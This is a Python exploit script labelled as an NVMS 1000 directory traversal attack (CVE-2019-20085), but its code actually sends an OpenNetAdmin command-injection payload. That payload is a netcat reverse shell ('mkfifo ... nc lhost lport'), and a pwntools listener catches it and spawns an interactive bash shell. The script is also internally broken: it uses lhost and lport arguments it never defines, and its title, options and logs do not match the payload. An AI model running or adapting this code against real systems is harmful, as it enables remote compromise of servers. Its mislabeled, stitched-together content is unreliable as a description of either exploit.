# -*- coding:utf-8 -*-
# NVMS 1000 - Directory Traversal Attack
# CVE: 2019-20085
# Exploit author: Numan TÃ¼rle
# Python script exploit author: Renan Almeida a.k.a. nullarmor <nullarmor@protonmail.com>

import argparse
import requests
import sys
import urllib
from pwn import *

def main():
    global proxies
    
    # args
    argparser = argparse.ArgumentParser(description='NVMS 1000 - Directory Traversal Attack',
                                        add_help=False)
    main_arg = argparser.add_argument_group("MAIN")

    main_arg.add_argument('-h', '--help',
                            help='Show this help menu',
                            action='store_true')

    main_arg.add_argument('--url', type=str,
                            help='Remote host to exploit',
                            required=True)

    main_arg.add_argument('--file', type=str,
                            help='File to be retrieved from the webserver',
                            required=True)
    
    main_arg.add_argument('--burpsuite', action='store_true',
                            help='Enable BurpSuite\'s proxy')

    args = argparser.parse_args()

    # arg validation
    if args.help:
        argparser.print_help()
        sys.exit(1)

    # cons
    url = args.url
    lhost = args.lhost
    lport = args.lport
    burpsuite = args.burpsuite

    # proxies
    proxies = { "http": "http://127.0.0.1:8080" }

    def reverse_shell(l):
        l.sendline('python3 -c "import pty;pty.spawn(\'/bin/bash\')"')
        l.interactive()

    def exploit():
        global proxies

        payload = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} > /tmp/f".format(lhost, lport)
        
        params = {
            "xajax": "window_submit",
            "xajaxr": "1574117726710",
            "xajaxargs[]": ["tooltips", 'ip=>;{}'.format(payload), 'ping']
        }

        l = listen(lport)
        l1 = log.progress("Exploiting the OpenNetAdmin web application")

        if burpsuite:
            try:
                r = requests.post(url, data=params, proxies=proxies, timeout=5)
            except:
                l1.success("Success!")
                log.info("Spawning the interactive shell")
                reverse_shell(l)

        else:
            try:
                r = requests.post(url, data=params, timeout=5)
            
            except:
                l1.success("Success!")
                log.info("Spawning the interactive shell")
                reverse_shell(l)

    # main
    log.info("NVMS 1000 - Directory Traversal Attack")
    log.info("Python script exploit author: nullarmor")
    
    exploit()


if __name__ == '__main__':
    main()